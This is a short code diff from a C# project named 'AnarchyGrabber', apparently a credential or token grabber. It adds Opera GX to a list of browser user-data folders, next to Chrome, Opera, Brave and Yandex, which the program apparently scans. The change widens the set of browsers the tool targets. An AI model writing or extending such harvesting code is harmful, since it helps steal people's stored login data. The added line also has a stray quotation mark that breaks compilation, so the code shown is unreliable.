@@ -16,7 +16,8 @@ namespace AnarchyGrabber
             new Service("Google Chrome", @"Local\Google\Chrome\User Data\Default"),
             new Service("Opera", @"Roaming\Opera Software\Opera Stable", true),
             new Service("Brave", @"Local\BraveSoftware\Brave-Browser\User Data\Default", true),
-            new Service("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default", true)
+            new Service("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default", true),
+            new Service("Opera GX", @"Roaming\Opera Software\Opera GX Stable", true")
         };
 
 
